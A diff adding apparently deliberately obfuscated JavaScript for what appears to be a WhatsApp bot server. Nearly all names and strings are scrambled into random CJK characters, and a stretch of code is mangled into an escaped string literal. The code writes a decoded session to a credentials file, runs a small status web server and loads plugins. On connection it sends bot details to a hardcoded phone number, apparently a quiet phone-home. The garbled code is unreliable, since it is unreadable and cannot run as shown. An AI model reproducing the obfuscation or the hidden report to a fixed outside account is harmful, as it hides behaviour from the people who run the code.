+    _樞劈帳溤._肶譊蓟繂櫅("\u274c _\u74bc\u5e97\u63c3\u86bb\u8892\u644e _\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756-_\u7c40\u957e\u7c39\u9e43 _\u520c\u5b43\u6936\u7481\u94fd\u565d _\u9386\u7af8\u8b5b\u84b4\u81a5");
+    _塨焼苧哟._芾匒琤囝睼(1);
+  }
+  
+  try {
+  const _己裄搎攠錆绠 = _蟶砛匛紧屾蠨廜.from(_刌孃椶璁铽噝._讅臎屍贳(7), '_\u8f01\u6714\u847a\u6d21\u79eb').toString('_\u7ed2\u910e\u761a\u8920\u6d8a\u64a2');
+  _藲飙暌斾艵莍喿._訨磸瓬帉(_己裄搎攠錆绠);  // _鄲鶵陡竇晌
+  _蠕坖厃嬴榏朅._攗伹丐溉掏(_渽酩謮龳夯紸觜, { _痸奦丮厣牎鏍: true });
+  _蠕坖厃嬴榏朅._戗归責夭錍慏(_韤灊飵囀渓紘鵪, _己裄搎攠錆绠, '_\u7ed2\u910e\u761a\u8920\u6d8a\u64a2');
+  _樞劈帳溤._肶譊蓟繂櫅("\u267b\ufe0f _\u7fc8\u5277\u752d\u9e4c\u8600 _\u8045\u6d38\u6752\u5d22\u60e7\u94d5\u67c2");
+} catch (_弙鉼蝎肮) {
+  _樞劈帳溤._羬龎拡鈥騑("\u274c _\u74bc\u5e97\u63c3\u86bb\u8892\u644e _\u520c\u5b43\u6936\u7481\u94fd\u565d _\u60db\u6bbb\u84e0\u5e14\u9e21\u9b88:", _弙鉼蝎肮._駑徕師凙样逹);
+  _塨焼苧哟._芾匒琤囝睼(1);
+}
+// _郵羉陜風樷崸蔤 _用欢蛀奃銲鴷襴 _鸥玭懦鳈憽批 from _犐鰭玢邍 if _虌貺蘄硋哫
+const _鴋瑎虝喦鹏潒 = _腞釿璴谧._囻烿竎蚤(_灔礬胊伏匞, '_\u6ae6\u63f5\u863b\u9ba6\u7113\u59f5\u90cc._\u93bf\u91bb\u4f75\u994b\u8ef6');
+if (_蠕坖厃嬴榏朅._踩炆繝渥矓颼辭(_鴋瑎虝喦鹏潒)) {
+  try {
+    const _噭笙髯昋 = _藲飙暌斾艵莍喿._訨磸瓬帉(_蠕坖厃嬴榏朅._寫剄椭嚧喅(_鴋瑎虝喦鹏潒, '_\u7ed2\u910e\u761a\u8920\u6d8a\u64a2'));
+    for (const [_漋噴挌潽掾笨, _鸥玭懦鳈憽批] of _倳欋薝疗摕闊沆._汙慠傀犎(_噭笙髯昋)) {
+      _礎朸鍄聾.set(_漋噴挌潽掾笨, _鸥玭懦鳈憽批);
+    }
+    _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u5670\u871b\u768b\u8c53\u6fd5 _\u9e25\u73ad\u61e6\u9cc8\u61bd\u6279 _\u8e6d\u5cd2\u8a6e\u800e\u51b7\u8fba from _\u7290\u9c2d\u73a2\u908d");
+  } catch (_亵隖嶐兑琬) {
+    _樞劈帳溤._肶譊蓟繂櫅("\u26a0\ufe0f _\u606f\u6b4a\u98d2\u770d\u6d56\u5701 _\u612e\u98d5\u7967\u6954\u88fb _\u9400\u9e05\u7ca4\u9883\u5bf4\u8c22\u5fec _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974 _\u9e25\u73ad\u61e6\u9cc8\u61bd\u6279");
+  }
+}
+
+// _栖膘屜分 _用欢蛀奃銲鴷襴 _鸥玭懦鳈憽批 _吖隦唧斣蝶 _犐鰭玢邍
+function _泐堂撶绑藹炣() {
+  try {
+    const _蹒漒嶳隡魫逮嫲 = {};
+    for (const [_漋噴挌潽掾笨, _鸥玭懦鳈憽批] of _礎朸鍄聾._汙慠傀犎()) {
+      _蹒漒嶳隡魫逮嫲[_漋噴挌潽掾笨] = _鸥玭懦鳈憽批;
+    }
+    _蠕坖厃嬴榏朅._戗归責夭錍慏(_鴋瑎虝喦鹏潒, _藲飙暌斾艵莍喿._鍁鸲惞篵(_蹒漒嶳隡魫逮嫲, null, 2), '_\u7ed2\u910e\u761a\u8920\u6d8a\u64a2');
+  } catch (_亵隖嶐兑琬) {
+    _樞劈帳溤._羬龎拡鈥騑("\u274c _\u606f\u6b4a\u98d2\u770d\u6d56\u5701 _\u612e\u98d5\u7967\u6954\u88fb _\u8d83\u80fa\u851a\u7a31\u81a6 _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974 _\u9e25\u73ad\u61e6\u9cc8\u61bd\u6279:", _亵隖嶐兑琬);
+  }
+}
+
+// _伭麟踈軞惚贙 _鎋獇男畷姲僪珍 for _飹玫鷊汐
+const _獂浌阻毷跱 = _畯卉惷垉厁蘊儑('_\u7342\u6d4c\u963b\u6bf7\u8df1');
+const _鴔磢鸵覿暡眠 = _獂浌阻毷跱();
+const _蚝飗蝢傇顟猤狀 = _塨焼苧哟._訍霟泅薘._辻垥鰆貲懇 || 9090;
+
+// _煅縍鵤鱜奓猃 _翗謧矮庾堋彦撈 _惴錖歐刄
+_鴔磢鸵覿暡眠.get('/', (_嘟據林嬑箚, _啩歚遰苕旯剿) => {
+  const _勭疨蚱濭軃闯泈 = _腞釿璴谧._囻烿竎蚤(_灔礬胊伏匞, '_\u5478\u8917\u5001\u90f0', '_\u5840\u9639\u798d\u7de8\u7c2d\u9e86\u64ed._\u6179\u9a86\u54f1\u6077');
+  if (_蠕坖厃嬴榏朅._踩炆繝渥矓颼辭(_勭疨蚱濭軃闯泈)) {
+    _啩歚遰苕旯剿._糵蘼鰄钌(_勭疨蚱濭軃闯泈);
+  } else {
+    _啩歚遰苕旯剿._舦羫昍鑢垲(`\u000a      <!_\u9c7b\u5281\u9321\u6a41\u6bef\u735a _\u6179\u9a86\u54f1\u6077>\u000a      <_\u6179\u9a86\u54f1\u6077>\u000a      <_\u6e60\u57da\u95e2\u568a\u7d75\u59f5\u8d2a>\u000a        <_\u5e81\u6f31\u795f\u5c19>_\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756-_\u7c40\u957e\u7c39\u9e43 _\u5410\u5d7c\u9e78\u8ae2\u6276</_\u5e81\u6f31\u795f\u5c19>\u000a        <_\u86e5\u76ba\u8b1f\u93bb\u98c8\u9c4d>\u000a          _\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14 { _\u6f10\u54cf\u6958\u5494-_\u86bc\u6758\u7fe9\u68f8\u9d19: _\u93ec\u8756\u8cb9\u6a1e\u5464\u9385; _\u6509\u83e6\u54c9\u6af7\u950f\u9d9e\u7776: _\u78f5\u99b2\u7a2a\u60c5-_\u5c20\u8aa4\u8e63\u710d\u53e4(135deg, #667eea 0%, #764ba2 100%); _\u775c\u55c9\u68a0\u5320\u5536\u9b50-_\u8820\u62fc\u5928\u879d\u61d4\u8581\u8537: _\u6297\u91a6\u7c6d\u64d2; _\u79bc\u67c7\u8814\u6c3d\u9dba: 50px; _\u564e\u7488\u7a8b\u50e6\u8b59\u733c: _\u5155\u6fcd\u64ea\u85af\u6689\u8aa6\u77d4; }\u000a          ._\u93d1\u4e84\u8be8\u9726 { _\u6509\u83e6\u54c9\u6af7\u950f\u9d9e\u7776: _\u8d6b\u74a6\u7e9d\u5b67\u7e03(255,255,255,0.1); _\u79bc\u67c7\u8814\u6c3d\u9dba: 30px; _\u50db\u8cf3\u8d55\u56dd\u7d6a\u9b11-_\u546d\u8bc6\u5547\u9d51\u840f\u660d\u9ed1: 10px; }\u000a          _\u52f5\u67e4\u5182\u66cc { _\u6f10\u54cf\u6958\u5494-_\u8e71\u9545\u9532\u5525\u67b9: 3em; }\u000a          ._\u5b03\u66a2\u604f\u8a54\u7d91\u8fed { _\u564e\u7488\u7a8b\u50e6\u8b59\u733c: #4CAF50; _\u6f10\u54cf\u6958\u5494-_\u7a64\u6f89\u8823\u4fd0\u6314\u79d0\u801c: _\u7909\u62a0\u50e3\u5ed5; }\u000a        </_\u86e5\u76ba\u8b1f\u93bb\u98c8\u9c4d>\u000a      </_\u6e60\u57da\u95e2\u568a\u7d75\u59f5\u8d2a>\u000a      <_\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14>\u000a        <_\u572b\u6e08\u6329\u6d1b\u5152 class="_\u93d1\u4e84\u8be8\u9726">\u000a          <_\u52f5\u67e4\u5182\u66cc>\u1f916 _\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756-_\u7c40\u957e\u7c39\u9e43</_\u52f5\u67e4\u5182\u66cc>\u000a          <_\u9b88\u84dc\u664f\u8b5a\u8ba0\u5831 class="_\u5b03\u66a2\u604f\u8a54\u7d91\u8fed">\u2705 _\u55fd\u5973\u92f1\u4e23\u90b1\u980d\u7035 _\u93fe\u591f\u4e14\u948a _\u75e3\u91d3\u63f7\u9feb\u6ac3</_\u9b88\u84dc\u664f\u8b5a\u8ba0\u5831>\u000a          <_\u9b88\u84dc\u664f\u8b5a\u8ba0\u5831>_\u8634\u520d\u6616\u751d\u6032\u6fc4 ._\u6f12\u95d7\u5b65\u810f\u9165\u5fab\u64b9 in _\u9eb1\u9e7a\u6433\u5c8a _\u5416\u96a6\u5527\u65a3\u8776 _\u884c\u85a5\u53e1\u9716\u5df5 _\u94c5\u63b2\u983f\u59ee\u53b4\u858c</_\u9b88\u84dc\u664f\u8b5a\u8ba0\u5831>\u000a          <_\u9b88\u84dc\u664f\u8b5a\u8ba0\u5831>_\u9aac\u5448\u6d2b\u547f\u6220: ${_\u9aad\u5dbc\u6801\u8d65\u4f45._\u5db2\u617e\u5825\u94fc\u50d2\u8130\u9de9 || '_\u6f31\u97cf\u82da\u4fac _\u93fe\u6847\u8544\u8fe9\u7ce5'}</_\u9b88\u84dc\u664f\u8b5a\u8ba0\u5831>\u000a        </_\u572b\u6e08\u6329\u6d1b\u5152>\u000a      </_\u9e6b\u9328\u8171\u5a5b\u5aee\u9aec\u5e14>\u000a      </_\u6179\u9a86\u54f1\u6077>\u000a    `);
+  }
+});
+
+_鴔磢鸵覿暡眠.get('/_\u5478\u8917\u5001\u90f0/_\u7e82\u6176\u9e11\u775f\u784c\u80d6._\u6179\u9a86\u54f1\u6077', (_嘟據林嬑箚, _啩歚遰苕旯剿) => {
+  _啩歚遰苕旯剿._儞沶瘂懘啴嚜榅('/');
+});
+
+_鴔磢鸵覿暡眠._穜圼縱猳(_蚝飗蝢傇顟猤狀, '0.0.0.0', () => _樞劈帳溤._肶譊蓟繂櫅(`\u1f310 _\u6ba6\u4fe1\u77ef\u4f52\u9c1b _\u938b\u7347\u7537\u7577\u59f2\u50ea\u73cd _\u870e\u8c24\u927b\u8a99\u95b4\u7e96 _\u9599\u76a5\u90dc\u5f48 _\u869d\u98d7\u8762\u5087\u985f\u7324\u72c0 ${_\u869d\u98d7\u8762\u5087\u985f\u7324\u72c0}`));
+
+// _葕靸鮄鬇弲襧癭 _吖隦唧斣蝶 get _枩槚锯盱鑓梆 _袿子餒郼 _咆澏奀俕鯷
+async function _跣戹诽侕遱嫆(_壏其蓙龸恆腅饃, _擌樒篙璬) {
+  try {
+    const _藧鬼嵐硶熕 = await _壏其蓙龸恆腅饃._埞躧摄編癙敃(_擌樒篙璬, '_\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5');
+    return _藧鬼嵐硶熕;
+  } catch {
+    return '_\u6a27\u8bee\u8555\u860d://_\u5323\u5a18\u969d\u5519\u9342\u9b52\u7b2a._\u7f20\u69dc\u688d\u8389\u526d._\u8a52\u8cf6\u873d\u730b\u54d1\u5418/_\u5954\u7758\u7aee\u7b0e\u643b\u91e3\u5a94._\u63e2\u8a1c\u791f\u51fe'; // _脣崩钓梺璁 _钦濊厃滫畯啟羵
+  }
+}
+
+// _靕絝庁魇鿴 _袨燕麟箙殗里 function
+async function _材檊脪撱慲絁菗() {
+  _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u910b\u7250\u82e8\u7289 _\u82a5\u944a\u639d\u99fe\u7717\u887f\u5c94 _\u5478\u8917\u5001\u90f0 _\u5396\u7b50\u65a2\u5bb8\u764a _\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80 _\u6b57\u75c3\u70ee\u53cd\u8c78");
+  
+  const _氚礴蔛牺匪婹 = _骭嶼栁赥佅._点蕂奓団药邁鄑 || '.';
+  _樞劈帳溤._肶譊蓟繂櫅(`\u1f916 _\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756-_\u7c40\u957e\u7c39\u9e43 _\u4f4b\u846b\u559c\u8b6d with _\u6c1a\u7934\u851b\u727a\u532a\u5a79: "${_\u6c1a\u7934\u851b\u727a\u532a\u5a79}"`);
+  
+  const { _绸閷龖砕蟁: _鮠葖槖竴埩嶽, _兕枾鶡鯉峠疽汀: _兕枾鶡鯉峠疽汀 } = await _劒醔釀摹孏(_灔礬胊伏匞 + '/_\u7827\u4e1e\u914e\u9167\u678d\u83e5/');
+  
+  // _郵羉陜風樷崸蔤 _瘜腥烔湐 _迚嫱魀褱酅 from _呸褗倁郰
+  let _迺膰腬栲獋釔, _瓈涭詭罏呛砗蟱, _筜鞔驪灩;
+  
+  try {
+    _迺膰腬栲獋釔 = _畯卉惷垉厁蘊儑('./_\u5478\u8917\u5001\u90f0/_\u8ffa\u81b0\u816c\u6832\u734b\u91d4');
+    _瓈涭詭罏呛砗蟱 = _畯卉惷垉厁蘊儑('./_\u5478\u8917\u5001\u90f0/_\u71be\u60ea\u88f9\u5247\u9bd5')._瓈涭詭罏呛砗蟱;
+    _筜鞔驪灩 = _畯卉惷垉厁蘊儑('./_\u5478\u8917\u5001\u90f0/_\u88a8\u71d5\u9e9f\u7b99\u6b97\u91cc');
+    _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u8b9d\u6c97\u996b\u698b\u9112\u9f69 _\u5323\u5a18\u969d\u5519\u9342\u9b52\u7b2a _\u8e6d\u5cd2\u8a6e\u800e\u51b7\u8fba _\u9ccb\u9a83\u8267\u7679\u9ee3\u6c0a\u79ef");
+  } catch (_弙鉼蝎肮) {
+    _樞劈帳溤._肶譊蓟繂櫅("\u274c _\u8796\u883d\u57d3\u6b81\u71d2\u65ff\u9445 _\u9b4a\u949a\u8d75\u5c03 _\u5478\u8917\u5001\u90f0 _\u5323\u5a18\u969d\u5519\u9342\u9b52\u7b2a:", _弙鉼蝎肮);
+    _塨焼苧哟._芾匒琤囝睼(1);
+  }
+  
+  const { _浲骃銁黵刲, _湃謲穤迵稸淩, _戟沁诂聵钂鶝寈, _鍵庬鲕橿, _讠鑵砛枻敩, _忈頴损雊冮噉, _渐鴺務鼊袉翧娇 } = _迺膰腬栲獋釔;
+  
+  const { _琑剣囚慞 } = await _普艿鮴呺伏();
+  
+  const _壏其蓙龸恆腅饃 = _辑隧廸峴({
+    _籮異鴮氮喊: _躽邂數稼蹒鈿蝕({ _咡杰鉶僊楶骫: '_\u7177\u6fd6\u868b\u7fb9\u7306\u8a4a\u8c74' }),
+    _吆宕躄莽: false,
+    _蕀鶤糧馿赯: ['_\u86ac\u701d\u8f13\u7550\u9678\u6ca3', '_\u75da\u6ab2\u4fe5\u4f1d\u62ae\u88a1\u978e', '20.0.04'],
+    _积沃夥儇: true,
+    _瞄狅天烴馢: _鮠葖槖竴埩嶽,
+    _琑剣囚慞: _琑剣囚慞
+  });
+
+  // _砾恆拃夸摥璠 _伬瞑鴥醬踤哎椶 _區愇朅鮰
+  _壏其蓙龸恆腅饃._讘乩孜侘瘂._閙皥郜彈('_\u54ce\u643e\u4f4a\u64d6\u8ba2\u57ac._\u4f2c\u7791\u9d25\u91ac\u8e24\u54ce\u6936', (_伬瞑鴥醬踤哎椶) => {
+    const { _哎搾佊擖订垬, _燤制褄檇葇鋅义 } = _伬瞑鴥醬踤哎椶;
+    
+    if (_哎搾佊擖订垬 === '_\u90ad\u94a1\u7f25\u96a2') {
+      const _蒸鑛跜赲餔 = _燤制褄檇葇鋅义._羬龎拡鈥騑?._冲恟瀣槉肣狤?._蒸鑛跜赲餔;
+      
+      if (_蒸鑛跜赲餔 === _透娲諨慶寒髚._罏泰枧傮祲踸刽) {
+        _樞劈帳溤._肶譊蓟繂櫅("\u274c _\u9568\u8c5a\u8242\u50e0 _\u8fec\u7f21\u6333\u7716\u6d3b _\u9c64\u7a17\u9ff0\u6a61\u77e5\u559f, _\u9590\u59fe\u8dec\u8df0\u714a\u9704\u81a5 delete _\u7827\u4e1e\u914e\u9167\u678d\u83e5 _\u5396\u7b50\u65a2\u5bb8\u764a _\u7c94\u5a11\u59f6\u51b0.");
+        _塨焼苧哟._芾匒琤囝睼();
+      } else if (_蒸鑛跜赲餔 === _透娲諨慶寒髚._粓犌理滊鵓) {
+        _樞劈帳溤._肶譊蓟繂櫅("\u274c _\u783e\u6046\u62c3\u5938\u6465\u74a0 _\u7637\u91d0\u8af2\u9a65\u71b1\u570e. _\u930a\u8936\u6566\u4f8f\u9ea0\u591c\u9a34 _\u520c\u5b43\u6936\u7481\u94fd\u565d _\u728d\u841a\u7b47\u7d8d _\u955c\u7cb7\u6516\u9db3\u8fcd.");
+        _塨焼苧哟._芾匒琤囝睼();
+      } else if (_燤制褄檇葇鋅义._羬龎拡鈥騑?._駑徕師凙样逹?._鹏兼衖穴("_\u921a\u9f63\u9417\u7458\u7aa5\u8efb _\u667b\u4e04\u7c52\u5ac0\u7e2f\u5ac3\u61f5")) {
+        _樞劈帳溤._肶譊蓟繂櫅("\u26a0\ufe0f _\u921a\u9f63\u9417\u7458\u7aa5\u8efb _\u667b\u4e04\u7c52\u5ac0\u7e2f\u5ac3\u61f5 _\u7fac\u9f8e\u62e1\u9225\u9a11. _\u8015\u81ff\u5f21\u61be _\u520c\u5b43\u6936\u7481\u94fd\u565d...");
+        _蠕坖厃嬴榏朅._昺蘡楗賨偩(_灔礬胊伏匞 + '/_\u7827\u4e1e\u914e\u9167\u678d\u83e5', { _痸奦丮厣牎鏍: true, _蒸懜抾埥矈嘲: true });
+        _材檊脪撱慲絁菗();
+      } else {
+        _樞劈帳溤._肶譊蓟繂櫅("\u1f504 _\u783e\u6046\u62c3\u5938\u6465\u74a0 _\u6063\u589d\u4f14\u8082\u540c\u7e5a\u821f, _\u6dd8\u71e9\u589c\u8a1a...");
+        _材檊脪撱慲絁菗();
+      }
+    } else if (_哎搾佊擖订垬 === '_\u9f4d\u84f0\u65ca\u8f5a\u7386') {
+      _樞劈帳溤._肶譊蓟繂櫅("\u2705 _\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756-_\u7c40\u957e\u7c39\u9e43 _\u5410\u5d7c\u9e78\u8ae2\u6276 _\u5274\u626f\u5210\u87da\u9ece\u6990 _\u5416\u96a6\u5527\u65a3\u8776 _\u9eb1\u9e7a\u6433\u5c8a!");
+      
+      // _郵羉陜風樷崸蔤 _淓愋汼璱諊貀
+      _樞劈帳溤._肶譊蓟繂櫅("\u1f50c _\u75dd\u7f22\u9c14\u9891\u7c83\u8f6a _\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80...");
+      const _慈醔覥摌 = _蠕坖厃嬴榏朅._郢驽毶玜('./_\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80/')._狉摊劼籓浛(_禴鴎屑竻藽秷 => _禴鴎屑竻藽秷._子偓嚩癎跹流埶('._\u8a1c\u810f\u8692\u8bb6'));
+      let _洝徧涰貼閰苌俤 = 0;
+      
+      for (const _犐鰭玢邍 of _慈醔覥摌) {
+        try {
+          _畯卉惷垉厁蘊儑('./_\u6dd3\u610b\u6c7c\u74b1\u8aca\u8c80/' + _犐鰭玢邍);
+          _洝徧涰貼閰苌俤++;
+          _樞劈帳溤._肶譊蓟繂櫅(`  \u2705 _\u7067\u7616\u6560\u712b: ${_\u7290\u9c2d\u73a2\u908d}`);
+        } catch (_弙鉼蝎肮) {
+          _樞劈帳溤._肶譊蓟繂櫅(`  \u274c _\u9f38\u9c17\u7597\u6b71\u6949 _\u5416\u96a6\u5527\u65a3\u8776 _\u9400\u9e05\u7ca4\u9883\u5bf4\u8c22\u5fec ${_\u7290\u9c2d\u73a2\u908d}: ${_\u5f19\u927c\u874e\u80ae._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039}`);
+        }
+      }
+      
+      _樞劈帳溤._肶譊蓟繂櫅(`\u2705 _\u5121\u6a57\u8891\u8cb9\u6d5b\u75d8 _\u8e6d\u5cd2\u8a6e\u800e\u51b7\u8fba: ${_\u6d1d\u5fa7\u6db0\u8cbc\u95b0\u82cc\u4fe4}/${_\u6148\u9194\u89a5\u644c._\u81bb\u8e0c\u4fc5\u6793\u513d\u98f2}`);
+      
+      // _厾蜫棧砍频臷渴 _哎搾佊擖订垬 _駑徕師凙样逹 with _钦濊厃滫畯啟羵
+      const _灖鷶喅燔 = `*\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf\u25cf\u25ba*\_\u51b0\u51d4\u58e6\u60f2> *_\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756-_\u7c40\u957e\u7c39\u9e43 _\u75e3\u91d3\u63f7\u9feb\u6ac3 _\u974c\u5be2\u6462\u6bba\u8724*\_\u51b0\u51d4\u58e6\u60f2\_\u51b0\u51d4\u58e6\u60f2> *_\u8634\u520d\u6616\u751d\u6032\u6fc4 ${_\u6c1a\u7934\u851b\u727a\u532a\u5a79}_\u6f12\u95d7\u5b65\u810f\u9165\u5fab\u64b9 _\u5416\u96a6\u5527\u65a3\u8776 _\u8383\u7141\u8e8e\u6303\u6592\u712f _\u94c5\u63b2\u983f\u59ee\u53b4\u858c*  \_\u51b0\u51d4\u58e6\u60f2\_\u51b0\u51d4\u58e6\u60f2*\u256d\u22b1\u272b _\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756 _\u7c40\u957e\u7c39\u9e43 \u272b\u22b1\u256e*\_\u51b0\u51d4\u58e6\u60f2*\u2502\u272b\u1f4c2 _\u5410\u5d7c\u9e78\u8ae2\u6276 _\u6619\u6dbb\u892a\u5884\u9083\u9a29\u5e92: ${_\u7b5c\u9794\u9a6a\u7069._\u55ff\u574b\u653d\u88ee}*\_\u51b0\u51d4\u58e6\u60f2*\u2502\u272b\u1f6e1\ufe0f _\u9aac\u5448\u6d2b\u547f\u6220: ${_\u9aad\u5dbc\u6801\u8d65\u4f45._\u5db2\u617e\u5825\u94fc\u50d2\u8130\u9de9}*\_\u51b0\u51d4\u58e6\u60f2*\u2502\u272b\u267b\ufe0f _\u5d75\u93c2\u5548\u5800\u6544: ${_\u6c1a\u7934\u851b\u727a\u532a\u5a79}*\_\u51b0\u51d4\u58e6\u60f2*\u2502\u272b\u1f30d _\u8398\u8c50\u81cb\u918f\u72c3\u7837: ${_\u9aad\u5dbc\u6801\u8d65\u4f45._\u5b74\u6455\u976a\u4eb7\u6c0c\u9794\u6deb}*\_\u51b0\u51d4\u58e6\u60f2*\u2502\u272b\u23f0 _\u97fe\u54dc\u7fe0\u625d: ${_\u9375\u5eac\u9c95\u6a7f(_\u5868\u713c\u82e7\u54df._\u8e82\u57c3\u6c88\u55cc\u5cc7())}*\_\u51b0\u51d4\u58e6\u60f2*\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf\u25cf\u25ba*\_\u51b0\u51d4\u58e6\u60f2\_\u51b0\u51d4\u58e6\u60f2> _\u5523\u5ca6\u9cd3\u9683\u55b1\u6d8d _\u910b\u7250\u82e8\u7289 _\u8596\u6772\u5b88\u8b3b\u67f3\u7f25\u9756 _\u7c40\u957e\u7c39\u9e43`;
+      
+      // _砒殈龜媢撊家 _垣螶荐婣惭裣璕 for _哎搾佊擖订垬 _駑徕師凙样逹
+      const _步劳矟铛 = '_\u6a27\u8bee\u8555\u860d://_\u5323\u5a18\u969d\u5519\u9342\u9b52\u7b2a._\u7f20\u69dc\u688d\u8389\u526d._\u8a52\u8cf6\u873d\u730b\u54d1\u5418/_\u5954\u7758\u7aee\u7b0e\u643b\u91e3\u5a94._\u63e2\u8a1c\u791f\u51fe';
+      
+      try {
+        // _厾蜫棧砍频臷渴 _吖隦唧斣蝶 _櫇玌厅戯伐 with _钦濊厃滫畯啟羵
+        _壏其蓙龸恆腅饃._菀暸鉎軔糊犰(_眵贴诌闭虿坠坭[0] + '237678687593@_\u7440\u7ce9\u9313\u7429\u744a\u9ad2\u5ead._\u716f\u82d4\u7334\u67c8._\u7336\u5692\u9ec0\u5bdd\u885a', {
+          _钦濊厃滫畯啟羵: { _叟侄軩寈皫鑄: _步劳矟铛 },
+          _熜脳蝥鏷潻彴傍: _灖鷶喅燔
+        }).catch(() => {
+          // _怮燈莇鞨 _吖隦唧斣蝶 _睜嗉梠匠唶魐 if _钦濊厃滫畯啟羵 _蜰傒峒鄘月
+          _壏其蓙龸恆腅饃._菀暸鉎軔糊犰(_眵贴诌闭虿坠坭[0] + '@_\u7440\u7ce9\u9313\u7429\u744a\u9ad2\u5ead._\u716f\u82d4\u7334\u67c8._\u7336\u5692\u9ec0\u5bdd\u885a', { _睜嗉梠匠唶魐: _灖鷶喅燔 });
+        });
+        
+        // _厾蜫棧砍频臷渴 _吖隦唧斣蝶 _袨燕麟箙殗里'_\u7440\u7ce9\u9313\u7429\u744a\u9ad2\u5ead _\u7b57\u7276\u8740\u6543\u6663\u65e2 _\u8d54\u781d\u7020\u7ab4\u99da\u8797\u6661\u000a        _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u67a9\u69da\u952f\u76f1\u9453\u6886._\u5df3\u91af\u583a\u538d, {\u000a          _\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5: { _\u53df\u4f84\u8ee9\u5bc8\u76ab\u9444: _\u6b65\u52b3\u77df\u94db },\u000a          _\u719c\u8133\u8765\u93f7\u6f7b\u5f74\u508d: _\u7056\u9df6\u5585\u71d4\u000a        }).catch(() => {\u000a          _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u67a9\u69da\u952f\u76f1\u9453\u6886._\u5df3\u91af\u583a\u538d, { _\u775c\u55c9\u68a0\u5320\u5536\u9b50: _\u7056\u9df6\u5585\u71d4 });\u000a        });\u000a        \u000a        _\u6a1e\u5288\u5e33\u6ea4._\u80b6\u8b4a\u84df\u7e42\u6ac5("\u2705 _\u783e\u6046\u62c3\u5938\u6465\u74a0 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u8d21\u8a2d\u96bd\u692d\u6868 with _\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5");\u000a      } catch (_\u5f19\u927c\u874e\u80ae) {\u000a        _\u6a1e\u5288\u5e33\u6ea4._\u80b6\u8b4a\u84df\u7e42\u6ac5("\u26a0\ufe0f _\u606f\u6b4a\u98d2\u770d\u6d56\u5701 _\u612e\u98d5\u7967\u6954\u88fb _\u8226\u7fab\u660d\u9462\u57b2 _\u54ce\u643e\u4f4a\u64d6\u8ba2\u57ac _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 with _\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5, _\u8a87\u5f28\u4fcc\u7468\u6cb0\u9d95 _\u775c\u55c9\u68a0\u5320\u5536\u9b50 _\u6b57\u75c3\u70ee\u53cd\u8c78");\u000a        _\u58cf\u5176\u84d9\u9fb8\u6046\u8145\u9943._\u83c0\u66b8\u924e\u8ed4\u7cca\u72b0(_\u7735\u8d34\u8bcc\u95ed\u867f\u5760\u576d[0] + '@_瑀糩錓琩瑊髒庭._煯苔猴柈._猶嚒黀寝衚', { _\u775c\u55c9\u68a0\u5320\u5536\u9b50: _\u7056\u9df6\u5585\u71d4 });\u000a      }\u000a    }\u000a  });\u000a\u000a  // _\u7913\u790c\u78b5\u90c7\u76a2\u648a\u9873-_\u88e9\u932f\u63eb\u5ced _\u5f0c\u869c\u8532\u8fe1\u8945\u000a  const _\u5b28\u56df\u7649\u8aff\u61ba\u66ff = `\u26a0\ufe0f *_\u86b1\u938e\u6087\u91a7\u751f\u96cd\u82e2-_\u62e1\u53d5\u709c\u53c9 _\u93fe\u591f\u4e14\u948a _\u8461\u96c7\u6bf4\u70c2\u8a5d* \u26a0\ufe0f\_\u51b0\u51d4\u58e6\u60f2\_\u5e11\u9caf\u9f41\u909c\u626d\u87c4 _\u8495\u68af\u5b48\u87d2\u8f16,\_\u51b0\u51d4\u58e6\u60f2\_\u81de\u8140\u5128\u74b8\u74d2\u5784\u656f _\u6af0\u5789\u6573\u885c _\u874c\u4fb4\u7daa\u58df\u7e17 _\u5416\u96a6\u5527\u65a3\u8776 _\u88e9\u932f\u63eb\u5ced _\u63f2\u561f\u77a1\u5a39 _\u88a8\u71d5\u9e9f\u7b99\u6b97\u91cc. _\u5955\u7a7f\u6c4a\u58a4\u6de0\u80b9 _\u769e\u935b\u4faa\u648c\u9b53\u62a0\u836d _\u92a2\u9e13\u88b7\u4fe9 _\u5f74\u5a35\u7968\u6513\u8279, _\u9590\u59fe\u8dec\u8df0\u714a\u9704\u81a5 _\u67c9\u52ec\u6067\u62d2\u7c58\u7430 from _\u5420\u8144\u5674\u6013\u5fa4\u9d37\u5186.\_\u51b0\u51d4\u58e6\u60f2\_\u518c\u7329\u5e97\u8f44 _\u9766\u53af\u75c2\u6573 for _\u72e3\u9a66\u599a\u6752\u87d3\u8331\u90e2 